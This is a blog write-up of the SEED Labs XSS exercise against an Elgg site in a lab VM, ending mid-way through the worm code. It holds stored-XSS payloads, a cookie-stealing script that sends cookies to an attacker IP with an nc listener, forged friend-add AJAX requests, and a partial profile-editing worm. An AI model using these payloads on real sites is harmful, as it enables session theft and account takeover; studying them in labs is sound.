<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="XSS Attack Lab - SeedLabs" /><meta property="og:locale" content="en" /><meta name="description" content="The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host the web application and there are a few users already created. Logging in to the web app will be done from a different vm on the same virtual box network." /><meta property="og:description" content="The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host the web application and there are a few users already created. Logging in to the web app will be done from a different vm on the same virtual box network." /><link rel="canonical" href="https://tanishq.page/blog/posts/xss-attack-lab/" /><meta property="og:url" content="https://tanishq.page/blog/posts/xss-attack-lab/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/seedlabs-cover.jpg" /><meta property="og:image:alt" content="Seed Labs Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-01T03:00:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/seedlabs-cover.jpg" /><meta name="twitter:image:alt" content="Seed Labs Artwork" /><meta property="twitter:title" content="XSS Attack Lab - SeedLabs" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-06-01T03:00:00-04:00","datePublished":"2020-06-01T03:00:00-04:00","description":"The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host the web application and there are a few users already created. Logging in to the web app will be done from a different vm on the same virtual box network.","headline":"XSS Attack Lab - SeedLabs","image":{"alt":"Seed Labs Artwork","url":"https://tanishq.page/blog/assets/img/covers/seedlabs-cover.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/xss-attack-lab/"},"url":"https://tanishq.page/blog/posts/xss-attack-lab/"}</script><title>XSS Attack Lab - SeedLabs | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/blog/">Tanishq Rupaal</a></h1><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>XSS Attack Lab - SeedLabs</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>XSS Attack Lab - SeedLabs</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1590994800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jun 1, 2020 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/seedlabs-cover.jpg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/seedlabs-cover.jpg" alt="Seed Labs Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">Seed Labs Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2088 words" > <em>11 min</em> read</span></div></div></div></header><div class="content"><p>The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host the web application and there are a few users already created. Logging in to the web app will be done from a different vm on the same virtual box network.</p><h2 id="task-1--post-a-malicious-message-to-display-an-alert-window"><span class="me-2">Task 1 : Post a malicious message to display an alert window</span><a href="#task-1--post-a-malicious-message-to-display-an-alert-window" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The web app is hosted on seedubuntu vm and ubuntu vm is used to create a new account user11. To make the web app visible as a site named <code class="language-plaintext highlighter-rouge">www.xsslabelgg.com</code>, add a name and IP address parameter on the ubuntu vm’s hosts file. Log into the account <code class="language-plaintext highlighter-rouge">user11</code>. Go to about me section. This section allows adding ‘about me’ information to our profiles. By default the editor provided is a rich text editor which adds extra text to whatever is inside. This is counterproductive to the attack therefore this editor is removed and the plain text editor is used. The section is used to add javascript code inside it -</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>On saving this an alert is displayed on the page. The web app sees the text inside the box to show it o nthe browser but since it is a js code, it gets executed. When some other user, say <code class="language-plaintext highlighter-rouge">alice</code>, tries to view the profile of <code class="language-plaintext highlighter-rouge">use11</code>, her webpage also gives the alert window.</p><h2 id="task-2--posting-a-malicious-message-to-display-cookies"><span class="me-2">Task 2 : Posting a malicious message to display cookies</span><a href="#task-2--posting-a-malicious-message-to-display-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is along the same lines as the previous task and does similar thing except the new code that is put inside the about me section now displays the cookie. The new code is -</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>This displays the cookie of <code class="language-plaintext highlighter-rouge">user11</code> when saved. On reloading too it does the same. When a separate user say <code class="language-plaintext highlighter-rouge">alice</code> navigates to <code class="language-plaintext highlighter-rouge">user11</code>’s account, her own cookie gets displayed. By design, the browser does not display the code, it runs it.</p><h2 id="task-3--stealing-cookies-from-the-victims-machine"><span class="me-2">Task 3 : Stealing cookies from the victim’s machine</span><a href="#task-3--stealing-cookies-from-the-victims-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This attack focuses on providing code in the ‘about me’ section such that the attacker can obtain the cookie without having to be preset when the account of <code class="language-plaintext highlighter-rouge">user11</code> is visited. For this the attacker injects a code that basically is a GET request for an image and also adds the cookie of the victim in the url itself.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src=http://192.168.56.4:1234?c=</span><span class="dl">'</span><span class="o">+</span><span class="nf">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">+</span><span class="dl">'</span><span class="s1">  &gt;</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>The IP address for the http part is the attacker’s IP address. On the attacker machine we can listen o the specified port using netcat or any other means.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-l</span> <span class="nt">-p</span> 1234
</pre></table></code></div></div><p>The next time someone on the web application, say <code class="language-plaintext highlighter-rouge">alice</code> visits the profile of <code class="language-plaintext highlighter-rouge">user11</code>, the code gets executed and the attacker gains the cookie for himself. The nc output seems like -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
</pre></table></code></div></div><p>The cookie starts after <code class="language-plaintext highlighter-rouge">%3D</code>.</p><h2 id="task-4--session-hijacking-using-the-stolen-cookies"><span class="me-2">Task 4 : session hijacking using the stolen cookies</span><a href="#task-4--session-hijacking-using-the-stolen-cookies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This task is about stealing the session of a legitimate user by using their cookie and then add the victim as a friend. To do this the process of adding a friend has to be known to the attacker. Therefore, the attacker creates another account say <code class="language-plaintext highlighter-rouge">samy</code>. This account can be added as a friend to <code class="language-plaintext highlighter-rouge">user11</code>’s account to observe the process of adding a friend. The attacker logs in to the account of <code class="language-plaintext highlighter-rouge">samy</code> and visits <code class="language-plaintext highlighter-rouge">user11</code>. Then he enables the inspect mode of the browser to watch the requests ad cookies as he adds <code class="language-plaintext highlighter-rouge">user11</code> as a friend to <code class="language-plaintext highlighter-rouge">samy</code>. The friend addig process then shows a GET request -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://www.xsslabelgg.com/action/friends/add?friend=43&amp;__elgg_ts=152022381&amp;__elgg_token=f0aaab1d9af23flb3lb876bfa5640cel
</pre></table></code></div></div><p>Also, the cookie is sent as a part of the request header. Therefore, the 3 important things noted are - 1. the <code class="language-plaintext highlighter-rouge">friend=43</code> part which specifies the umber associated with the <code class="language-plaintext highlighter-rouge">user11</code> account. 2. the cookie sent as a part of request header. 3. the two parts <code class="language-plaintext highlighter-rouge">__elgg_ts</code> and <code class="language-plaintext highlighter-rouge">__elgg_token</code> which are tokens used as a countermeasure against the cross site request forgery attack. The above have to be found and can also be found on the view-source page of the website. The two tokens are stored in variables as mentioned above and since they are different for every web user, even if the attacker does not know the tokens of user <code class="language-plaintext highlighter-rouge">alice</code>, the name of the two token variables can be used to call the values. The response part for the request under inspect element can help locate these variables being used as - <code class="language-plaintext highlighter-rouge">elgg.security.token.__elgg_ts</code> and <code class="language-plaintext highlighter-rouge">elgg.security.token.__elgg_token</code>. Using these variables, the attack code can be formed. Use of cookie retrieval technique to retrieve the two tokens as well.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src=http://192.168.56.4:1234?c=</span><span class="dl">'</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="o">+</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="o">+</span><span class="dl">'</span><span class="s1">  &gt;</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>The nc output seems like this -</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>GET /?c=1520227817&amp;0fab54e97b2fa75c39d298de602a5939 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
</pre></table></code></div></div><p>The tokens are separated by the <code class="language-plaintext highlighter-rouge">&amp;</code>. If the web app does not match passwords (or the case when we have the password of the intended victim), we can simply use a python script to use the authentication and use <code class="language-plaintext highlighter-rouge">requests</code> module to send a <code class="language-plaintext highlighter-rouge">GET</code> request and the attack will have been executed. The code will take the input from the nc command and the output of nc command can be split into sections to get the required cookies and the tokens. Then the script can be used to send a request to the desired link using the HTTPBasicAuth module and the cookies and parameters set along with the <code class="language-plaintext highlighter-rouge">GET</code> request. This can be used in cases when the script file we make is bigger than the allowed number of characters inside the text box that has the vulnerability.</p><p>To actually make other accounts execute the malicious code that can trigger them making the attacker their friend, the code needs to be in the same place where the previous codes to obtain cookie and the tokens were placed. This is the case when the password of the victim is not held with the attacker.</p><p>For this we can use the following code in javascript using AJAX and then store it into the ‘about me’ section of <code class="language-plaintext highlighter-rouge">user11</code>. The code is as follows -</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/action/friends/add?friend=43</span><span class="dl">"</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="nx">token</span><span class="p">;</span>
<span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/profile/user11</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">Ajax</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>This code forms the GET request to duplicate the add friend action of the web app. When the victim say <code class="language-plaintext highlighter-rouge">alice</code> views the homepage of the attacker <code class="language-plaintext highlighter-rouge">user11</code>, her browser will read this code and execute the javascript inside the tags. Since the user <code class="language-plaintext highlighter-rouge">alice</code> is logged in while the code is executed, the attack will run smoothly and <code class="language-plaintext highlighter-rouge">user11</code> will be added to the friend list of <code class="language-plaintext highlighter-rouge">alice</code>.</p><h2 id="task-5--writing-an-xss-worm"><span class="me-2">Task 5 : Writing an XSS worm</span><a href="#task-5--writing-an-xss-worm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This task is about coding a worm which can change the information of an account in the web app. This requires the analysis of changing the ‘about me’ section in the web app. The attacker <code class="language-plaintext highlighter-rouge">user11</code> uses the other account <code class="language-plaintext highlighter-rouge">samy</code> to update the ‘about me’ section to study the process. The ‘inspect element’ reveals that the process is a POST request which requires few parameters from the document. These parameters are specific to the session and the user, therefore, searching the parameters in the document, they are set as follows - 1. timestamp and token i.e., <code class="language-plaintext highlighter-rouge">__elgg_ts</code> and <code class="language-plaintext highlighter-rouge">__elgg_token</code> are stored in the document under <code class="language-plaintext highlighter-rouge">elgg.security.token</code> section in the html document. 2. user name of the session user is in JSON format variable called <code class="language-plaintext highlighter-rouge">elgg.session.user</code>. 3. guid of the session user is also in the <code class="language-plaintext highlighter-rouge">elgg.session.user</code> section. 4. the parameter <code class="language-plaintext highlighter-rouge">description</code> is the one that specifies what data is stored in the text field of the ‘about me’ section. 5. the <code class="language-plaintext highlighter-rouge">description</code> parameter has a control access field called <code class="language-plaintext highlighter-rouge">accesslevel[description]</code> which is 2 for private users, 1 for friends, 0 for others - has to be set to 2 always for changing the data in the ‘about me’ section.</p><p>The objective is to write a javascript code in the ‘about me’ section of <code class="language-plaintext highlighter-rouge">user11</code> such that when someone visits the profile of <code class="language-plaintext highlighter-rouge">user11</code>, the status as required by <code class="language-plaintext highlighter-rouge">user11</code> which is also set on his own account will be set on the account of the one who visits <code class="language-plaintext highlighter-rouge">user11</code>‘s page. The javascript code must contain the post request required to proceed with the changing of the text in the ’about me’ section. The code is as follows -</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/action/profile/edit</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>
<span class="nx">ff</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/profile/</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">params</span><span class="o">=</span><span class="dl">"</span><span class="s2">__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;description=User-11-is-great</span><span class="dl">"</span><span class="o">+</span>
